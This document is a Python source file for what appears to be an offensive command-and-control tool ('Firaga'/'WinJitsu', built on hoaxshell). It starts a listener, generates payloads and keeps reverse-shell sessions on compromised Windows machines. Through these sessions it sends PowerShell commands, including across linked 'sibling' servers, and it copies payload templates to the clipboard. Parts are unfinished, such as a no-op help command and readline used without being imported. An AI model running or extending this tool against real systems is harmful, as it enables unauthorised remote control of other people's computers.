#!/bin/python3
# Written by Panagiotis Chartas (t3l3machus)

import os, sys, argparse, re, threading, keyboard, rlcompleter
from threading import Thread
from importlib import import_module
from subprocess import DEVNULL, STDOUT, check_call, check_output, run
from pyperclip import copy as copy2cb
from time import sleep
from Core.common import *
# ~ from Core.core_server import *
from Core.firaga_core import Payload_generator, initiate_hoax_server, Sessions_manager, Hoaxshell, Core_server
from string import ascii_uppercase, ascii_lowercase

# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(
	formatter_class=argparse.RawTextHelpFormatter,
	epilog='''
	
Usage examples:

  - Basic shell session over http:

      sudo python3 hoaxshell.py -s <your_ip>
      
  - Recommended usage to avoid detection (over http)

'''
)

parser.add_argument("-s", "--server-ip", action="store", help = "Your hoaxshell server ip address or domain.")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate.")
parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")

args = parser.parse_args()


# -------------- General Functions -------------- #

def print_banner():

	padding = '  '

	# ~ W = [[' ', '┬', ' ', '┬'], [' ', '│','│','│'], [' ', '└','┴','┘']]
	# ~ I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	# ~ N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]
	# ~ J = [[' ','┬'], [' ','│'], ['└','┘']]
	# ~ I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	# ~ T = [['┌','┬','┐'], [' ','│',' '], [' ','┴',' ']]
	# ~ S = [['┌','─','┐'], ['└','─','┐'], ['└','─','┘']]
	# ~ U = [['┬',' ','┬'], ['│',' ','│'], ['└','─','┘']]


	# ~ S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]
	# ~ A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]	
	# ~ U = [[' ', '┬',' ','┬'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	# ~ R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
	# ~ O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	# ~ N = [[' ', '┌','┐','┌'], [' ', '│','│','│'], [' ', '┘','└','┘']]	

	F = [[' ', '┌','─','┬'], [' ', '├','┤',' '], [' ', '└',' ',' ']]
	I =	[[' ', '┬'], [' ', '│',], [' ', '┴']]
	R = [[' ', '┬','─','┐'], [' ', '├','┬','┘'], [' ', '┴','└','─']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]	
	G = [[' ', '┌','─','┐'], [' ', '│',' ','┬'], [' ', '└','─','┘']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]


	# ~ banner = [W,I,N,J,I,T,S,U]
	# ~ banner = [S,A,U,R,O,N]
	banner = [F,I,R,A,G,A]
	final = []
	print('\r')
	# ~ init_color = 43
	init_color = 3
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 30

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{END}{padding}          by t3l3machus\n')



def print_green(msg):
	print(f'{GREEN}{msg}{END}')


def print_shadow(msg):
	print(f'{GRAY}{msg}{END}')


def promptHelpMsg():
	print(
	'''
	\r  Command                    Description
	\r  -------                    -----------
	\r  help                       Print this message.
	\r  payload                    Print payload (base64).
	\r  rawpayload                 Print payload (raw).
	\r  clear                      Clear screen.
	\r  exit/quit/q                Close session and exit.
	''')


def alias_sanitizer(word, _min = 2, _max = 26):
	
	length = len(word)
	
	if length >= _min and length <= _max:
	
		valid = ascii_uppercase + ascii_lowercase + '-_'
		
		for char in word:
			
			if char not in valid:
				print(f'HEADER value includes illegal character "{char}".')
				return [f'Alias includes illegal character: "{char}".']
		
		return word
				
	else:
		return ['Alias length must be between 2 to 26 characters.']
# ------------------ Settings ------------------ #

quiet = True if args.quiet else False




# ~ def generatePayload(path):
	# ~ source = open(path, 'r') 			
	# ~ payload = source.read().strip().replace("\n"," ")
	# ~ source.close()
	# ~ payload = re.sub(' +', ' ', payload)
	# ~ print_green(payload)
	# ~ copy2cb(payload)
	# ~ print('Copied to clipboard!')
	# ~ #encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
	
# ~ def generate_find_cmd()
# ~ r = 
# ~ find_template = 'gci -Path "*PATH*"  -Recurse 2> $null | where {$_.Name -like "*WORD*"}'

# ------------------ Classes ------------------ #
# ~ class Core:
	
	# ~ def __init__(self):
		
		# ~ # Check if dependencies are met
		# ~ #smbserver_check = True if run('smbserver.py -h', shell=True, stdout=DEVNULL).returncode == 0 else False
		
		# ~ self.settings = {
		
			# ~ 'SMB Server' : {
				# ~ 'DRIVE_NAME' : 'winjitsu',
				# ~ 'LOCAL_SHARE' : os.path.dirname(os.path.abspath(__file__)),
				# ~ 'USERNAME' : 'winjitsu',
				# ~ 'PASSWORD' : 'password',
				# ~ 'LHOST' : False,
				# ~ #'AVAILABLE' : smbserver_check,
				# ~ 'RUNNING' : False
			# ~ }
		
		# ~ }



	# ~ def start_smb_server(self):
		
		# ~ if self.settings["SMB Server"]["AVAILABLE"] == True:
			
			# ~ try:
				# ~ #cmd = 'gnome-terminal -- bash -c ' + f'\'smbserver.py -smb2support {self.settings["SMB Server"]["DRIVE_NAME"]} {self.settings["SMB Server"]["LOCAL_SHARE"]}\''
				# ~ cmd = f'smbserver.py -smb2support {self.settings["SMB Server"]["DRIVE_NAME"]} {self.settings["SMB Server"]["LOCAL_SHARE"]}'
				# ~ smb_server = threading.Thread(name='smb_server', target=check_output, args=(cmd, shell = True)).daemon = True
				# ~ smb_server.start()
				
				# ~ current_module = import_module(module_path.replace('/', '.') , package=None)
				
				
			# ~ except:
				# ~ print('Failed to initialize smb server.')
		
		# ~ else:
			# ~ print('Impacket\'s smbserver.py module does not appear to be installed.')



	# ~ def print_core_settings(self):
		
		# ~ settings = self.settings
		
		# ~ print('\nSetting  Current Value  Description\n------  -------------  -----------')
		
		# ~ for group in settings.keys():
			
			# ~ print(f'\n{UNDERLINE}{group}{END}:')
			
			# ~ for setting in settings[group].keys():
				# ~ name = setting
				# ~ val = settings[group][setting]
				
				# ~ if isinstance(val, bool):
					# ~ val = 'True' if val else 'False'
					
				# ~ desc = ''
				# ~ print(f'{name + " "*(abs(len(name) - 6))}  {val + " "*(abs(len(val) - 13))}  {desc + " "*(abs(len(desc) - 11))}')
			
		# ~ print('\n')




class WJ_module:
	
	def __init__(self, module_path):
		
		template = self.template = import_module('Resources.' + module_path.replace('/', '.'), package=None)
		self.options = template.options
		self.payload = template.payload
		self.meta = template.meta
		self.supported_commands = template.supported_commands
		#import templates.enum_registry as template


	def get_longest_str(self, l):
		
		_max = 0
		
		for item in l:
			if len(item) > _max:
				_max = len(item)

		return _max



	def print_module_options(self):
		
		options = self.options
			
		# Print table headers
		headers = ['Option', 'Current Value', 'Required', 'Description']	
		values = []
		header_line = ""
		underline = ""
		num_of_rows = len(options.keys())
		rows = ['' for r in range(0, num_of_rows)]
		
		# Make a list of all values
		values = [list(options.keys()),[],[],[]]
		
		for opt in options.keys():
			val = options[opt]["value"] if options[opt]["value"] is str else str(options[opt]["value"]).strip("[]")
			req = 'True' if options[opt]["required"] else 'False'
			desc = options[opt]["description"]
			values[1].append(val)
			values[2].append(req)
			values[3].append(desc)
			
		# Adjust table based on values length 
		i = 0
		for h in headers:
			max_key_len = self.get_longest_str(values[i])
			dif = (max_key_len - len(h)) + 2
			padding = (' ' * dif) if dif > 0 else '  '
			header_line += f"{h}{padding}"
			underline += f"{len(h)*'-'}{padding}"
			i += 1
		
		i = 0
		h = 0
		for r in range(0, num_of_rows):
			for l in values:
				max_key_len = self.get_longest_str(l)
				if max_key_len >= len(headers[h]):
					dif = (max_key_len - len(l[r])) + 2
				else: 
					dif = abs((len(headers[h]) - len(l[r]))) + 2
				padding = (' ' * dif) if dif > 0 else '  '
				rows[i] += f"{l[r]}{padding}"
				h += 1
			h = 0
			i += 1
		
		# Print headers and rows
		print('\n' + header_line + '\n' + underline)
		
		for r in rows:
			print(r)

		print('\n')



	def set_module_option(self, opt, val):
		
		try:
			opt = opt.upper()
			
			if opt in self.options.keys():
				self.options[opt]["value"] = val
				print(f'{opt} => {val}')
				
		except:
			print('Failed to set value.')



	def copyPayload(self):
		
		try:
			payload = self.payload.strip().replace("\n"," ")
			payload = payload.replace("\t"," ")
			payload = re.sub(' +', ' ', payload)
			
			for opt in self.options.keys():
				
				value = self.options[opt]['value']
				
				if isinstance(value, list):
					value = str(value).strip("[]")
					
				payload = payload.replace(f"*{opt}*", value)
			
			print_shadow(payload)
			copy2cb(payload)
			print(f'{ORANGE}Copied to clipboard!{END}')

		except:
			print('Failed to generate payload.')



	def execute(self):
		
		# ~ try:
		self.template.execute()
		
		# ~ except:
			# ~ print('Module execution failed.')



# Tab completer          
class Completer(object):
	
	tab_counter = 0
	
	def reset_counter(self):
		sleep(0.5)
		Completer.tab_counter = 0
		
	
	def complete(self, text, state):
		
		Completer.tab_counter += 1
		root = os.path.dirname(os.path.abspath(__file__)) + '/Resources'
		main_commands = ['use', 'list']
		module_commands = ['set', 'copy', 'exec', 'run', 'execute']
		
		line_buffer_val = readline.get_line_buffer().strip()
		lb_list = re.sub(' +', ' ', line_buffer_val).split(' ')
		lb_list_len = len(lb_list)

		# Command "use" autocomplete paths
		if lb_list[0] == '':
			pass
		
		# Command "use" autocomplete paths
		elif lb_list[0].lower() == 'use' and lb_list_len > 1:
			
			search_term = lb_list[1]
			
			# Check if root or subdir
			path_level = search_term.split('/')
			
			if re.search('/', search_term) and len(path_level) > 1:
				search_term	= path_level[-1]
				
				for i in range(0, len(path_level)-1):
					root += f'/{path_level[i]}'
				
			dirs = next(os.walk(root))[1]
			match = [d+'/' for d in dirs if re.match(f'^{search_term}', d)]
			files = next(os.walk(root))[2]
			match += [f.rsplit(".", 1)[0] for f in files if re.match(f'^{search_term}', f)]
			
			# Appending match substring 
			if len(match) == 1:
				typed = len(search_term)
				readline.insert_text(match[0][typed:])
				Completer.tab_counter = 0
				
			# Print all matches
			elif len(match) > 1 and Completer.tab_counter > 1:
				print_shadow('\n' + str(match).strip("[]").replace("'", ""))
				Completer.tab_counter = 0
				Main_prompt.rst_prompt(force_rst = True)
				
			#elif len(match) > 1:
			
		# Reset tab counter after 0.5s of inactivity
		threading.Thread(name="reset_counter", target=self.reset_counter).start()
 
		# Main commands autocomplete
		#elif lb_list[0].lower() == 'use' and lb_list_len > 1
		
		
		

	
def main():

	try:
		
		chill() if quiet else print_banner()
		# ~ global prompt, main_prompt_ready
		active_module = False
		current_module = None
		cwd = os.path.dirname(os.path.abspath(__file__))
		
		''' Update utility '''
		if args.update:

			updated = False

			try:

				print(f'[{INFO}] Pulling changes from the master branch...')
				u = check_output(f'cd {cwd}&&git pull https://github.com/t3l3machus/winjitsu main', shell=True).decode('utf-8')

				if re.search('Updating', u):
					print(f'[{INFO}] Update completed! Please, restart winjitsu.')
					updated = True

				elif re.search('Already up to date', u):
					print(f'[{INFO}] Already running the latest version!')
					pass

				else:
					print(f'[{FAILED}] Something went wrong. Are you running winjitsu from your local git repository?')
					print(f'[{DEBUG}] Consider running "git pull https://github.com/t3l3machus/winjitsu main" inside the project\'s directory.')

			except:
				print(f'[{FAILED}] Update failed. Consider running "git pull https://github.com/t3l3machus/winjitsu main" inside the project\'s directory.')

			if updated:
				sys.exit(0)
		
		
		
		''' Init Firaga's Core '''
		core = Core_server()
		core_server = Thread(target = core.initiate, args = ())
		core_server.daemon = True
		core_server.start()
		
		initiate_hoax_server()
		payload_engine = Payload_generator()
		sessions_manager = Sessions_manager()
		Hoaxshell.server_unique_id = core.return_server_uniq_id()

		
		''' Start tab autoComplete '''
		comp = Completer()
		# we want to treat '/' as part of a word, so override the delimiters
		readline.set_completer_delims(' \t\n;')
		readline.parse_and_bind("tab: complete")
		readline.set_completer(comp.complete)		
		
		#del sys.modules['requests']		
		

		''' +---------[ Command prompt ]---------+'''
		while True:
			
			if Main_prompt.main_prompt_ready:
				#re.findall("'{1}[\s\S]*'{1}", x)
				#user_input = input(prompt).strip().split(' ')
				user_input = input(Main_prompt.prompt).strip()
				
				# Handle single/double quoted arguments
				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
				quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
				quoted_args = quoted_args_single + quoted_args_double
				
				if len(quoted_args):
					
					for arg in quoted_args:
						space_escaped = arg.replace(' ', Main_prompt.SPACE)
						
						if (space_escaped[0] == "'" and space_escaped[-1] == "'") or (space_escaped[0] == '"' and space_escaped[-1] == '"'):
							space_escaped = space_escaped[1:-1]
													
						user_input = user_input.replace(arg, space_escaped)
						
				
				
				# Create cmd-line args list
				user_input = user_input.split(' ')
				cmd_list = [w.replace(Main_prompt.SPACE, ' ') for w in user_input if w]
				cmd_list_len = len(cmd_list)
				cmd = cmd_list[0].lower() if cmd_list else ''



				if cmd == 'help':
					#promptHelpMsg()
					pass
				
				
				
				elif cmd == 'use' and cmd_list[1]:	
					
					try:
						current_module = WJ_module(cmd_list[1])		
						active_module = True
						_type = cmd_list[1].split('/')[0]
						Main_prompt.prompt = f'{UNDERLINE}WinJitsu{END} {_type}({GREEN}{current_module.meta["title"]}{END}) > '
					
					except SyntaxError:
						print('Failed to load module. There seems to be a syntax error in the template.')
					
					except IndentationError:
						print('Failed to load module. There seems to be an indentation error in the template.')				
					
					except:
						print('Failed to load module.')
					
					
					
				elif cmd == 'options':
					current_module.print_module_options() if active_module else print('No active template.')



				elif cmd == 'set' and cmd_list[1] and cmd_list[2]:
					current_module.set_module_option(cmd_list[1], cmd_list[2]) if active_module else print('No active template.')



				elif cmd in ['copy']: #'exec'
					
					if active_module:
						
						if cmd in current_module.supported_commands:
							
							if cmd == 'copy':
								current_module.copyPayload()
								
							elif cmd in ['exec', 'run', 'execute']:
								current_module.execute() 
								
					else:
						print('No active module.')



				# ----- Core Commands -----
				
				elif cmd == 'settings':
					core.print_core_settings()
		


				elif cmd == 'id':
					print(f'{BOLD}Server unique id{END}: {ORANGE}{core.return_server_uniq_id()}{END}')



				elif cmd == 'connect':
					
					if cmd_list_len == 3:
						
						Thread(target = core.connect_with_sibling_server, args = (cmd_list[1], cmd_list[2]), daemon = True).start()
						Main_prompt.main_prompt_ready = False
								
					else:
						print('Missing arguments.')

		
				
				elif cmd == 'host':
					
					if len(cmd_list[1]) > 1:
						
						try:
							cmd = 'gnome-terminal --geometry=100x50 -- bash -c ' + f'\'python3 {cwd}/Core/host.py {cmd_list[1]} {cmd_list[2]}\''
							check_output(cmd, shell = True)
							
						except ValueError:
							print('Invalid or non-existent interface name.')



				elif cmd == 'generate':
					
					if len(cmd_list) > 1:
											
						payload_engine.generate_payload(cmd_list[1:])
								
					else:
						print('Missing arguments.')



				elif cmd == 'kill':
					
					if cmd_list_len == 2:
											
						sessions_manager.kill_session(cmd_list[1])
								
					else:
						print('Unrecognized or missing arguments.')
						



				elif cmd == 'exec':
					
					if cmd_list_len == 3:
						
						if len(Sessions_manager.active_sessions.keys()):
							
							Main_prompt.main_prompt_ready = False
							command = cmd_list[1]
							session_id = cmd_list[2]
							
							if command == "pwd": 
								command = "split-path $pwd'\\0x00'"
							
							# Check if session id has alias
							session_id = sessions_manager.alias_to_session_id(session_id)
							
							# Check who is the owner of the shell session
							session_owner_id = sessions_manager.return_session_owner_id(session_id)
							
							if session_owner_id == core.return_server_uniq_id():
								Hoaxshell.command_pool[session_id].append(command + ";pwd")
							
							else:
								command = command + ";pwd" + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
								core.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)

						else:
							print(f'\r[{INFO}] No active session.')		

					else:
						print('Missing arguments.')
						
				

				elif cmd == 'alias':
					
					if cmd_list_len == 3:
						
						sessions = Sessions_manager.active_sessions.keys()
						
						if len(sessions):
							if cmd_list[2] in sessions:
								
								alias = alias_sanitizer(cmd_list[1])
								
								if isinstance(alias, list):
									print(alias[0])
									
								else:
									# Check if alias is unique
									unique = True
									
									for session_id in sessions:
										if Sessions_manager.active_sessions[session_id]['alias'] == alias.strip():
											unique = False
											break
									
									
									# Check if alias is the id of another session	
									is_session_id = False
									
									if alias.strip() in sessions:
										is_session_id = True
										
									if unique and not is_session_id:
										Sessions_manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()
										Sessions_manager.active_sessions[cmd_list[2]]['aliased'] = True
									
									else:
										print('Illegal alias value.')
										
							else:
								print('Invalid session ID.')

						else:
							print(f'\r[{INFO}] No active session.')		

					else:
						print('Missing arguments.')




				elif cmd in ['clear', 'cls']:
					os.system('clear')



				elif cmd in ['exit', 'quit', 'q']:
					raise KeyboardInterrupt



				elif cmd == 'sessions':

					if cmd_list_len == 1:
											
						sessions_manager.list_sessions()
								
					else:
						print('Unsupported arguments.')
				


				elif cmd == 'siblings':

					if cmd_list_len == 1:
											
						core.list_siblings()
								
					else:
						print('Unsupported arguments.')
				



				elif cmd == 'back':
					
					if active_module:
						del current_module
						Main_prompt.prompt = Main_prompt.original_prompt
						active_module = False
					
					else:
						print('No active module.')

				elif cmd == '':
					continue
					#rst_prompt(force_rst = True, prompt = '\r')

				else:
					print('Unknown command.')


	except KeyboardInterrupt:
		
		print('\r')
		Core_server.announce_server_shutdown()					
		Hoaxshell.terminate()
		core.stop_listener()
		sys.exit(0)



if __name__ == '__main__':
	main()
